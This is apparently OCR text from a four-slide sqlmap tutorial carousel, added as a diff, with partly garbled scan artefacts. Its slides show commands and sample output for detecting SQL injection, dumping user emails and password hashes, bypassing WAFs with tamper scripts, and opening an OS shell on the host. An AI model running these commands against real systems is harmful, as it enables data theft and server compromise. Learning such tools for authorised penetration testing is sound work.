@@ -1,0 +1,91 @@
+--- time_01.jpg ---
+eo wy I : Se y |
+\ i . } a
+‘\ ‘ ‘f IN
+a
+From URL to,full
+database dump.
+wale SOLMapyworktlon
+5 SS
+--- time_02.jpg ---
+me
+=
+Basic Vulnerability Detection
+eee
+$ sqlmap -u "http://target.com/item?id=1"
+[*] starting @ 14:22:08 /2026-04-18/
+[INFO] testing connection to the target
+[INFO] testing if GET parameter 'id' is dynamic
+[INFO] heuristic test shows ‘id' might be injectable
+[INFO] testing for SQL injection on GET param ‘id’
+[INFO] GET parameter 'id' is vulnerable.
+Parameter: id (GET)
+Type: boolean-based blind
+Type: time-based blind
+Type: UNION query
+FLAGS
+-u Target URL with at least one GET parameter
+(default) Runs heuristic + injection tests on every parameter
+OVERVIEW
+The entry point of every SQLMap workflow. Point -u at a URL with a parameter
+and SQLMap auto-detects injection type, DBMS, and backend version before you
+touch anything else.
+@kerem.tech @eeoeee
+--- time_03.jpg ---
+»
+i
+Columns & Data Dump
+eee
+$ sqlmap -u "http://target.com/item?id=1" \
+-D shop_prod -T users \
+-C email,password --dump
+[INFO] fetching columns for table ‘users' in ‘shop_prod'
+[INFO] fetching entries of column(s) ‘email, password’
+Database: shop_prod
+Table: users [3 entries]
+teen eee e ee eee ee teen ener ee eee eee eee eee ee +
+| email | password |
+foe 2-2-2 - 2-2-2 ------- fo 2-2 2-2-2 ----------------- +
+| admin@shop.local | $2y$10$X09...r8a (admin) |
+| jane@shop. local | $2y$10$Kq2...wlp |
+| bob@shop. local | $2y$10$Lm4...t3z |
+FLAGS
+-T Target a specific table
+--columns List columns for that table
+-C Dump only these columns (comma separated)
+--dump Extract actual row data from the table
+--dump-all Dump every table of every database. Loud.
+OVERVIEW
+The payoff. Pick a table, pick columns, and pull real data. Use -C to stay surgical
+instead of dumping everything. Hashes get auto-detected and offered for
+cracking.
+@kerem.tech e@eeoeeeoe
+--- time_04.jpg ---
+& ‘a
+WAF Bypass & Shell Access
+eee
+$ sqlmap -u "http://target.com/item?id=1" \
+--tamper=space2comment,between \
+--random-agent --proxy=http://127.0.0.1:8080 \
+--os-shell
+[INFO] loading tamper scripts: space2comment, between
+[INFO] setting random HTTP User-Agent header
+[INFO] routing traffic via 127.0.0.1:8080
+[INFO] going to upload the file stager
+[INFO] the file stager has been successfully uploaded
+os-shell> whoami
+www-data
+os-shell> id
+uid=33(www-data) gid=33(www-data) groups=33
+FLAGS
+--tamper Chain obfuscation scripts to bypass WAFS
+--random-agent Rotate areal browser User-Agent per run
+--proxy Route through Burp or a SOCKS/HTTP proxy
+--os-shell Drop into an interactive OS shell via the DB
+--sql-shell Run raw SQL queries interactively
+--file-read Read arbitrary files from the DB server
+OVERVIEW
+Top shelf SQLMap. Tamper scripts slip past WAFs, a proxy keeps everything in
+Burp, and --os-shell turns a DB bug into RCE on the host. Use only on systems
+you are authorized to test.
+@kerem.tech e@eeeeee
